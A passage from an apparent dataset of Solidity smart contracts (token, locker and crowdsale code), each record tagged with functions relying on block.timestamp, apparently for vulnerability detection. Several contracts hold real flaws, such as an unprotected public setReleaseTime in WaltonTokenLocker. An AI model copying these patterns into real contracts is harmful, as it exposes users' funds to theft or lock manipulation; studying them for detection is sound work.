!= address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply = totalSupply.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n Mint(_to, _amount);\n Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n MintFinished();\n return true;\n }\n}\ncontract FreezableToken is StandardToken {\n mapping (bytes32 => uint64) internal chains;\n mapping (bytes32 => uint) internal freezings;\n mapping (address => uint) internal freezingBalance;\n event Freezed(address indexed to, uint64 release, uint amount);\n event Released(address indexed owner, uint amount);\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return super.balanceOf(_owner) + freezingBalance[_owner];\n }\n function actualBalanceOf(address _owner) public view returns (uint256 balance) {\n return super.balanceOf(_owner);\n }\n function freezingBalanceOf(address _owner) public view returns (uint256 balance) {\n return freezingBalance[_owner];\n }\n function freezingCount(address _addr) public view returns (uint count) {\n uint64 release = chains[toKey(_addr, 0)];\n while (release != 0) {\n count ++;\n release = chains[toKey(_addr, release)];\n }\n }\n function getFreezing(address _addr, uint _index) public view returns (uint64 _release, uint _balance) {\n for (uint i = 0; i < _index + 1; i ++) {\n _release = chains[toKey(_addr, _release)];\n if (_release == 0) {\n return;\n }\n }\n _balance = freezings[toKey(_addr, _release)];\n }\n function freezeTo(address _to, uint _amount, uint64 _until) public {\n require(_to != address(0));\n require(_amount <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n bytes32 currentKey = toKey(_to, _until);\n freezings[currentKey] = freezings[currentKey].add(_amount);\n freezingBalance[_to] = freezingBalance[_to].add(_amount);\n freeze(_to, _until);\n Transfer(msg.sender, _to, _amount);\n emit Freezed(_to, _until, _amount);\n }\n function releaseOnce() public {\n bytes32 headKey = toKey(msg.sender, 0);\n uint64 head = chains[headKey];\n require(head != 0);\n require(uint64(block.timestamp) > head);\n bytes32 currentKey = toKey(msg.sender, head);\n uint64 next = chains[currentKey];\n uint amount = freezings[currentKey];\n delete freezings[currentKey];\n balances[msg.sender] = balances[msg.sender].add(amount);\n freezingBalance[msg.sender] = freezingBalance[msg.sender].sub(amount);\n if (next == 0) {\n delete chains[headKey];\n }\n else {\n chains[headKey] = next;\n delete chains[currentKey];\n }\n emit Released(msg.sender, amount);\n }\n function releaseAll() public returns (uint tokens) {\n uint release;\n uint balance;\n (release, balance) = getFreezing(msg.sender, 0);\n while (release != 0 && block.timestamp > release) {\n releaseOnce();\n tokens += balance;\n (release, balance) = getFreezing(msg.sender, 0);\n }\n }\n function toKey(address _addr, uint _release) internal pure returns (bytes32 result) {\n result = 0x5749534800000000000000000000000000000000000000000000000000000000;\n assembly {\n result := or(result, mul(_addr, 0x10000000000000000))\n result := or(result, _release)\n }\n }\n function freeze(address _to, uint64 _until) internal {\n require(_until > block.timestamp);\n bytes32 key = toKey(_to, _until);\n bytes32 parentKey = toKey(_to, uint64(0));\n uint64 next = chains[parentKey];\n if (next == 0) {\n chains[parentKey] = _until;\n return;\n }\n bytes32 nextKey = toKey(_to, next);\n uint parent;\n while (next != 0 && _until > next) {\n parent = next;\n parentKey = nextKey;\n next = chains[nextKey];\n nextKey = toKey(_to, next);\n }\n if (_until == next) {\n return;\n }\n if (next != 0) {\n chains[key] = next;\n }\n chains[parentKey] = _until;\n }\n}\ncontract ERC223Receiver {\n function tokenFallback(address _from, uint _value, bytes _data) public;\n}\ncontract ERC223Basic is ERC20Basic {\n function transfer(address to, uint value, bytes data) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint value, bytes data);\n}\ncontract SuccessfulERC223Receiver is ERC223Receiver {\n event Invoked(address from, uint value, bytes data);\n function tokenFallback(address _from, uint _value, bytes _data) public {\n emit Invoked(_from, _value, _data);\n }\n}\ncontract FailingERC223Receiver is ERC223Receiver {\n function tokenFallback(address, uint, bytes) public {\n revert();\n }\n}\ncontract ERC223ReceiverWithoutTokenFallback {\n}\ncontract BurnableToken is StandardToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n require(_value > 0);\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(burner, _value);\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n Unpause();\n }\n}\ncontract FreezableMintableToken is FreezableToken, MintableToken {\n function mintAndFreeze(address _to, uint _amount, uint64 _until) onlyOwner canMint public returns (bool) {\n totalSupply = totalSupply.add(_amount);\n bytes32 currentKey = toKey(_to, _until);\n freezings[currentKey] = freezings[currentKey].add(_amount);\n freezingBalance[_to] = freezingBalance[_to].add(_amount);\n freeze(_to, _until);\n emit Mint(_to, _amount);\n emit Freezed(_to, _until, _amount);\n emit Transfer(msg.sender, _to, _amount);\n return true;\n }\n}\ncontract Consts {\n uint constant TOKEN_DECIMALS = 18;\n uint8 constant TOKEN_DECIMALS_UINT8 = 18;\n uint constant TOKEN_DECIMAL_MULTIPLIER = 10 ** TOKEN_DECIMALS;\n string constant TOKEN_NAME = \"Boldman\";\n string constant TOKEN_SYMBOL = \"BOLD\";\n bool constant PAUSED = false;\n address constant TARGET_USER = 0xAd30dB42B88548943655FdEF4d94a342Fa4490dE;\n uint constant START_TIME = 1529361000;\n bool constant CONTINUE_MINTING = true;\n}\ncontract ERC223Token is ERC223Basic, BasicToken, FailingERC223Receiver {\n using SafeMath for uint;\n function transfer(address _to, uint _value, bytes _data) public returns (bool) {\n uint codeLength;\n assembly {\n codeLength := extcodesize(_to)\n }\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n if(codeLength > 0) {\n ERC223Receiver receiver = ERC223Receiver(_to);\n receiver.tokenFallback(msg.sender, _value, _data);\n }\n emit Transfer(msg.sender, _to, _value, _data);\n return true;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n bytes memory empty;\n return transfer(_to, _value, empty);\n }\n}\ncontract MainToken is Consts, FreezableMintableToken, BurnableToken, Pausable\n{\n function name() pure public returns (string _name) {\n return TOKEN_NAME;\n }\n function symbol() pure public returns (string _symbol) {\n return TOKEN_SYMBOL;\n }\n function decimals() pure public returns (uint8 _decimals) {\n return TOKEN_DECIMALS_UINT8;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool _success) {\n require(!paused);\n return super.transferFrom(_from, _to, _value);\n }\n function transfer(address _to, uint256 _value) public returns (bool _success) {\n require(!paused);\n return super.transfer(_to, _value);\n }\n}",
  "extract_feature": [
    "function releaseOnce() public {\nbytes32 headKey = toKey(msg.sender, 0);\nuint64 head = chains[headKey];\nrequire(head != 0);\nrequire(uint64(block.timestamp) > head);\nbytes32 currentKey = toKey(msg.sender, head);\nuint64 next = chains[currentKey];\nuint amount = freezings[currentKey];\ndelete freezings[currentKey];\nbalances[msg.sender] = balances[msg.sender].add(amount);\nfreezingBalance[msg.sender] = freezingBalance[msg.sender].sub(amount);\nif (next == 0) {\ndelete chains[headKey];\n}\nelse {\nchains[headKey] = next;\ndelete chains[currentKey];\n}\nemit Released(msg.sender, amount);\n}",
    "function releaseAll() public returns (uint tokens) {\nuint release;\nuint balance;\n(release, balance) = getFreezing(msg.sender, 0);\nwhile (release != 0 && block.timestamp > release) {\nreleaseOnce();\ntokens += balance;\n(release, balance) = getFreezing(msg.sender, 0);\n}\n}",
    "function freeze(address _to, uint64 _until) internal {\nrequire(_until > block.timestamp);\nbytes32 key = toKey(_to, _until);\nbytes32 parentKey = toKey(_to, uint64(0));\nuint64 next = chains[parentKey];\nif (next == 0) {\nchains[parentKey] = _until;\nreturn;\n}\nbytes32 nextKey = toKey(_to, next);\nuint parent;\nwhile (next != 0 && _until > next) {\nparent = next;\nparentKey = nextKey;\nnext = chains[nextKey];\nnextKey = toKey(_to, next);\n}\nif (_until == next) {\nreturn;\n}\nif (next != 0) {\nchains[key] = next;\n}\nchains[parentKey] = _until;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f8b"
  },
  "filename": "9505.sol",
  "content": "pragma solidity ^0.4.11;\ncontract Token {\n function transfer(address to, uint256 value) returns (bool success);\n function transferFrom(address from, address to, uint256 value) returns (bool success);\n function approve(address spender, uint256 value) returns (bool success);\n function totalSupply() constant returns (uint256 totalSupply) {}\n function balanceOf(address owner) constant returns (uint256 balance);\n function allowance(address owner, address spender) constant returns (uint256 remaining);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract WaltonTokenLocker {\n address public beneficiary;\n uint256 public releaseTime;\n Token public token = Token('0xb7cB1C96dB6B22b0D3d9536E0108d062BD488F74');\n function WaltonTokenLocker() public {\n beneficiary = address('0xa43e4646ee8ebd9AD01BFe87995802D984902e25');\n releaseTime = 1563379200;\n }\n function release() public {\n if (block.timestamp < releaseTime)\n throw;\n uint256 totalTokenBalance = token.balanceOf(this);\n if (totalTokenBalance > 0)\n if (!token.transfer(beneficiary, totalTokenBalance))\n throw;\n }\n function releaseToken(address _tokenContractAddress) public {\n if (block.timestamp < releaseTime)\n throw;\n Token _token = Token(_tokenContractAddress);\n uint256 totalTokenBalance = _token.balanceOf(this);\n if (totalTokenBalance > 0)\n if (!_token.transfer(beneficiary, totalTokenBalance))\n throw;\n }\n function releaseTimestamp() public constant returns (uint timestamp) {\n return releaseTime;\n }\n function currentTimestamp() public constant returns (uint timestamp) {\n return block.timestamp;\n }\n function secondsRemaining() public constant returns (uint timestamp) {\n if (block.timestamp < releaseTime)\n return releaseTime - block.timestamp;\n else\n return 0;\n }\n function tokenLocked() public constant returns (uint amount) {\n return token.balanceOf(this);\n }\n function setReleaseTime(uint256 _releaseTime) public {\n releaseTime = _releaseTime;\n }\n}",
  "extract_feature": [
    "function release() public {\nif (block.timestamp < releaseTime)\nthrow;\nuint256 totalTokenBalance = token.balanceOf(this);\nif (totalTokenBalance > 0)\nif (!token.transfer(beneficiary, totalTokenBalance))\nthrow;\n}",
    "function releaseToken(address _tokenContractAddress) public {\nif (block.timestamp < releaseTime)\nthrow;\nToken _token = Token(_tokenContractAddress);\nuint256 totalTokenBalance = _token.balanceOf(this);\nif (totalTokenBalance > 0)\nif (!_token.transfer(beneficiary, totalTokenBalance))\nthrow;\n}",
    "function currentTimestamp() public constant returns (uint timestamp) {\nreturn block.timestamp;\n}",
    "function secondsRemaining() public constant returns (uint timestamp) {\nif (block.timestamp < releaseTime)\nreturn releaseTime - block.timestamp;\nelse\nreturn 0;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1f8c"
  },
  "filename": "9521.sol",
  "content": "pragma solidity ^0.4.11;\ncontract Token {\n function transfer(address to, uint256 value) returns (bool success);\n function transferFrom(address from, address to, uint256 value) returns (bool success);\n function approve(address spender, uint256 value) returns (bool success);\n function totalSupply() constant returns (uint256 totalSupply) {}\n function balanceOf(address owner) constant returns (uint256 balance);\n function allowance(address owner, address spender) constant returns (uint256 remaining);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract WaltonTokenLocker {\n address public beneficiary;\n uint256 public releaseTime;\n Token public token = Token('0xb7cB1C96dB6B22b0D3d9536E0108d062BD488F74');\n function WaltonTokenLocker() public {\n beneficiary = address('0xa43e4646ee8ebd9AD01BFe87995802D984902e25');\n releaseTime = 1563379200;\n }\n function release() public {\n uint256 totalTokenBalance;\n uint256 totalEthBalance;\n if (block.timestamp < releaseTime)\n throw;\n totalTokenBalance = token.balanceOf(this);\n totalEthBalance = this.balance;\n if (totalTokenBalance > 0)\n if (!token.transfer(beneficiary, totalTokenBalance))\n throw;\n if (totalEthBalance > 0)\n if (!beneficiary.send(totalEthBalance))\n throw;\n }\n function releaseTimestamp() public constant returns (uint timestamp) {\n return releaseTime;\n }\n function currentTimestamp() public constant returns (uint timestamp) {\n return block.timestamp;\n }\n function secondsRemaining() public constant returns (uint timestamp) {\n return releaseTime - block.timestamp;\n }\n function setReleaseTime(uint256 _releaseTime) public {\n releaseTime = _releaseTime;\n }\n}",
  "extract_feature": [
    "function release() public {\nuint256 totalTokenBalance;\nuint256 totalEthBalance;\nif (block.timestamp < releaseTime)\nthrow;\ntotalTokenBalance = token.balanceOf(this);\ntotalEthBalance = this.balance;\nif (totalTokenBalance > 0)\nif (!token.transfer(beneficiary, totalTokenBalance))\nthrow;\nif (totalEthBalance > 0)\nif (!beneficiary.send(totalEthBalance))\nthrow;\n}",
    "function currentTimestamp() public constant returns (uint timestamp) {\nreturn block.timestamp;\n}",
    "function secondsRemaining() public constant returns (uint timestamp) {\nreturn releaseTime - block.timestamp;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1f8d"
  },
  "filename": "9531.sol",
  "content": "pragma solidity ^0.4.23;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(\n address _from,\n address _to,\n uint256 _value\n )\n public\n returns (bool)\n {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(\n address _owner,\n address _spender\n )\n public\n view\n returns (uint256)\n {\n return allowed[_owner][_spender];\n }\n function increaseApproval(\n address _spender,\n uint _addedValue\n )\n public\n returns (bool)\n {\n allowed[msg.sender][_spender] = (\n allowed[msg.sender][_spender].add(_addedValue));\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(\n address _spender,\n uint _subtractedValue\n )\n public\n returns (bool)\n {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract RefundVault is Ownable {\n using SafeMath for uint256;\n enum State { Active, Refunding, Closed }\n mapping (address => uint256) public deposited;\n address public wallet;\n State public state;\n event Closed();\n event RefundsEnabled();\n event Refunded(address indexed beneficiary, uint256 weiAmount);\n constructor(address _wallet) public {\n require(_wallet != address(0));\n wallet = _wallet;\n state = State.Active;\n }\n function deposit(address investor) onlyOwner public payable {\n require(state == State.Active);\n deposited[investor] = deposited[investor].add(msg.value);\n }\n function close() onlyOwner public {\n require(state == State.Active);\n state = State.Closed;\n emit Closed();\n wallet.transfer(address(this).balance);\n }\n function enableRefunds() onlyOwner public {\n require(state == State.Active);\n state = State.Refunding;\n emit RefundsEnabled();\n }\n function refund(address investor) public {\n require(state == State.Refunding);\n uint256 depositedValue = deposited[investor];\n deposited[investor] = 0;\n investor.transfer(depositedValue);\n emit Refunded(investor, depositedValue);\n }\n}\ncontract CryptualProjectToken is StandardToken, Ownable {\n using SafeMath for uint256;\n string public constant name = \"Cryptual Project Token\";\n string public constant symbol = \"CPT\";\n uint8 public constant decimals = 0;\n uint256 public constant INITIAL_SUPPLY = 283000000;\n address public wallet;\n uint256 public constant PRESALE_OPENING_TIME = 1530356400;\n uint256 public constant PRESALE_CLOSING_TIME = 1530921600;\n uint256 public constant PRESALE_RATE = 150000;\n uint256 public constant PRESALE_WEI_CAP = 500 ether;\n uint256 public constant PRESALE_WEI_GOAL = 50 ether;\n uint256 public constant CROWDSALE_OPENING_TIME = 1531047600;\n uint256 public constant CROWDSALE_CLOSING_TIME = 1533686400;\n uint256 public constant CROWDSALE_WEI_CAP = 5000 ether;\n uint256 public constant COMBINED_WEI_GOAL = 750 ether;\n uint256[] public crowdsaleWeiAvailableLevels = [1000 ether, 1500 ether, 2000 ether];\n uint256[] public crowdsaleRates = [135000, 120000, 100000];\n uint256[] public crowdsaleMinElapsedTimeLevels = [0, 12 * 3600, 18 * 3600, 21 * 3600, 22 * 3600];\n uint256[] public crowdsaleUserCaps = [1 ether, 2 ether, 4 ether, 8 ether, CROWDSALE_WEI_CAP];\n mapping(address => uint256) public crowdsaleContributions;\n uint256 public presaleWeiRaised;\n uint256 public crowdsaleWeiRaised;\n constructor(\n address _wallet\n ) public {\n require(_wallet != address(0));\n wallet = _wallet;\n vault = new RefundVault(wallet);\n totalSupply_ = INITIAL_SUPPLY;\n balances[msg.sender] = INITIAL_SUPPLY;\n emit Transfer(0x0, msg.sender, INITIAL_SUPPLY);\n }\n event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable {\n uint256 weiAmount = msg.value;\n require(_beneficiary != address(0));\n require(weiAmount != 0);\n bool isPresale = block.timestamp >= PRESALE_OPENING_TIME && block.timestamp <= PRESALE_CLOSING_TIME;\n bool isCrowdsale = block.timestamp >= CROWDSALE_OPENING_TIME && block.timestamp <= CROWDSALE_CLOSING_TIME;\n require(isPresale || isCrowdsale);\n uint256 tokens;\n if (isCrowdsale) {\n require(crowdsaleWeiRaised.add(weiAmount) <= CROWDSALE_WEI_CAP);\n require(crowdsaleContributions[_beneficiary].add(weiAmount) <= getCrowdsaleUserCap());\n tokens = _getCrowdsaleTokenAmount(weiAmount);\n require(tokens != 0);\n crowdsaleWeiRaised = crowdsaleWeiRaised.add(weiAmount);\n } else if (isPresale) {\n require(presaleWeiRaised.add(weiAmount) <= PRESALE_WEI_CAP);\n require(whitelist[_beneficiary]);\n tokens = weiAmount.mul(PRESALE_RATE).div(1 ether);\n require(tokens != 0);\n presaleWeiRaised = presaleWeiRaised.add(weiAmount);\n }\n _processPurchase(_beneficiary, tokens);\n emit TokenPurchase(\n msg.sender,\n _beneficiary,\n weiAmount,\n tokens\n );\n if (isCrowdsale) crowdsaleContributions[_beneficiary] = crowdsaleContributions[_beneficiary].add(weiAmount);\n vault.deposit.value(msg.value)(msg.sender);\n }\n function getCrowdsaleUserCap() public view returns (uint256) {\n require(block.timestamp >= CROWDSALE_OPENING_TIME && block.timestamp <= CROWDSALE_CLOSING_TIME);\n uint256 elapsedTime = block.timestamp.sub(CROWDSALE_OPENING_TIME);\n uint256 currentMinElapsedTime = 0;\n uint256 currentCap = 0;\n for (uint i = 0; i < crowdsaleUserCaps.length; i++) {\n if (elapsedTime < crowdsaleMinElapsedTimeLevels[i]) continue;\n if (crowdsaleMinElapsedTimeLevels[i] < currentMinElapsedTime) continue;\n currentCap = crowdsaleUserCaps[i];\n }\n return currentCap;\n }\n function _getCrowdsaleTokenAmount(uint256 _weiAmount) internal view returns (uint256) {\n uint256 uncountedWeiRaised = crowdsaleWeiRaised;\n uint256 uncountedWeiAmount = _weiAmount;\n uint256 tokenAmount = 0;\n for (uint i = 0; i < crowdsaleWeiAvailableLevels.length; i++) {\n uint256 weiAvailable = crowdsaleWeiAvailableLevels[i];\n if (uncountedWeiRaised >= weiAvailable) {\n uncountedWeiRaised = uncountedWeiRaised.sub(weiAvailable);\n } else {\n if (uncountedWeiRaised > 0) {\n weiAvailable = weiAvailable.sub(uncountedWeiRaised);\n uncountedWeiRaised = 0;\n }\n if (uncountedWeiAmount <= weiAvailable) {\n tokenAmount = tokenAmount.add(uncountedWeiAmount.mul(crowdsaleRates[i]));\n break;\n } else {\n uncountedWeiAmount = uncountedWeiAmount.sub(weiAvailable);\n tokenAmount = tokenAmount.add(weiAvailable.mul(crowdsaleRates[i]));\n }\n }\n }\n return tokenAmount.div(1 ether);\n }\n function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {\n totalSupply_ = totalSupply_.add(_tokenAmount);\n balances[_beneficiary] = balances[_beneficiary].add(_tokenAmount);\n emit Transfer(0x0, _beneficiary, _tokenAmount);\n }\n mapping(address => bool) public whitelist;\n function addToPresaleWhitelist(address _beneficiary) external onlyOwner {\n whitelist[_beneficiary] = true;\n }\n function addManyToPresaleWhitelist(address[] _beneficiaries) external onlyOwner {\n for (uint256 i = 0; i < _beneficiaries.length; i++) {\n whitelist[_beneficiaries[i]] = true;\n }\n }\n function removeFromPresaleWhitelist(address _beneficiary) external onlyOwner {\n whitelist[_beneficiary] = false;\n }\n bool public isCrowdsaleFinalized = false;\n event CrowdsaleFinalized();\n function finalizeCrowdsale() external {\n require(!isCrowdsaleFinalized);\n require(block.timestamp > CROWDSALE_CLOSING_TIME || (block.timestamp > PRESALE_CLOSING_TIME && presaleWeiRaised < PRESALE_WEI_GOAL));\n if (combinedGoalReached()) {\n vault.close();\n } else {\n vault.enableRefunds();\n }\n emit CrowdsaleFinalized();\n isCrowdsaleFinalized = true;\n }\n RefundVault public vault;\n function claimRefund() external {\n require(isCrowdsaleFinalized);\n require(!combinedGoalReached());\n vault.refund(msg.sender);\n }\n function combinedGoalReached() public view returns (bool) {\n return presaleWeiRaised.add(crowdsaleWeiRaised) >= COMBINED_WEI_GOAL;\n }\n}",
  "extract_feature": [
    "function buyTokens(address _beneficiary) public payable {\nuint256 weiAmount = msg.value;\nrequire(_beneficiary != address(0));\nrequire(weiAmount != 0);\nbool isPresale = block.timestamp >= PRESALE_OPENING_TIME && block.timestamp <= PRESALE_CLOSING_TIME;\nbool isCrowdsale = block.timestamp >= CROWDSALE_OPENING_TIME && block.timestamp <= CROWDSALE_CLOSING_TIME;\nrequire(isPresale || isCrowdsale);\nuint256 tokens;\nif (isCrowdsale) {\nrequire(crowdsaleWeiRaised.add(weiAmount) <= CROWDSALE_WEI_CAP);\nrequire(crowdsaleContributions[_beneficiary].add(weiAmount) <= getCrowdsaleUserCap());\ntokens = _getCrowdsaleTokenAmount(weiAmount);\nrequire(tokens != 0);\ncrowdsaleWeiRaised = crowdsaleWeiRaised.add(weiAmount);\n} else if (isPresale) {\nrequire(presaleWeiRaised.add(weiAmount) <= PRESALE_WEI_CAP);\nrequire(whitelist[_beneficiary]);\ntokens = weiAmount.mul(PRESALE_RATE).div(1 ether);\nrequire(tokens != 0);\npresaleWeiRaised = presaleWeiRaised.add(weiAmount);\n}\n_processPurchase(_beneficiary, tokens);\nemit TokenPurchase(\nmsg.sender,\n_beneficiary,\nweiAmount,\ntokens\n);\nif (isCrowdsale) crowdsaleContributions[_beneficiary] = crowdsaleContributions[_beneficiary].add(weiAmount);\nvault.deposit.value(msg.value)(msg.sender);\n}",
    "function getCrowdsaleUserCap() public view returns (uint256) {\nrequire(block.timestamp >= CROWDSALE_OPENING_TIME && block.timestamp <= CROWDSALE_CLOSING_TIME);\nuint256 elapsedTime = block.timestamp.sub(CROWDSALE_OPENING_TIME);\nuint256 currentMinElapsedTime = 0;\nuint256 currentCap = 0;\nfor (uint i = 0; i < crowdsaleUserCaps.length; i++) {\nif (elapsedTime < crowdsaleMinElapsedTimeLevels[i]) continue;\nif (crowdsaleMinElapsedTimeLevels[i] < currentMinElapsedTime) continue;\ncurrentCap = crowdsaleUserCaps[i];\n}\nreturn currentCap;\n}",
    "function finalizeCrowdsale() external {\nrequire(!isCrowdsaleFinalized);\nrequire(block.timestamp > CROWDSALE_CLOSING_TIME || (block.timestamp > PRESALE_CLOSING_TIME && presaleWeiRaised < PRESALE_WEI_GOAL));\nif (combinedGoalReached()) {\nvault.close();\n} else {\nvault.enableRefunds();\n}\nemit CrowdsaleFinalized();\nisCrowdsaleFinalized = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1f8e"
  },
  "filename": "9558.sol",
  "content": "pragma solidity ^0.4.22;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0 || b == 0){\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n function pow(uint256 a, uint256 b) internal pure returns (uint256){\n if (b == 0){\n return 1;\n }\n uint256 c = a**b;\n assert (c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n address public newOwner;\n address public techSupport;\n address public newTechSupport;\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n modifier onlyTechSupport() {\n require(msg.sender == techSupport || msg.sender == owner);\n _;\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n require(_newOwner != address(0));\n newOwner = _newOwner;\n }\n function acceptOwnership() public {\n if (msg.sender == newOwner) {\n owner = newOwner;\n }\n }\n function transferTechSupport (address _newSupport) public{\n require (msg.sender == owner || msg.sender == techSupport);\n newTechSupport = _newSupport;\n }\n function acceptSupport() public{\n if(msg.sender == newTechSupport){\n techSupport = newTechSupport;\n }\n }\n}\ncontract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) external payable returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) external payable returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) public payable returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) external payable returns (bytes32 _id);\n function queryN(uint _timestamp, string _datasource, bytes _argN) public payable returns (bytes32 _id);\n function queryN_withGasLimit(uint _timestamp, string _datasource, bytes _argN, uint _gaslimit) external payable returns (bytes32 _id);\n function getPrice(string _datasource) public returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) public returns (uint _dsprice);\n function setProofType(byte _proofType) external;\n function setCustomGasPrice(uint _gasPrice) external;\n function 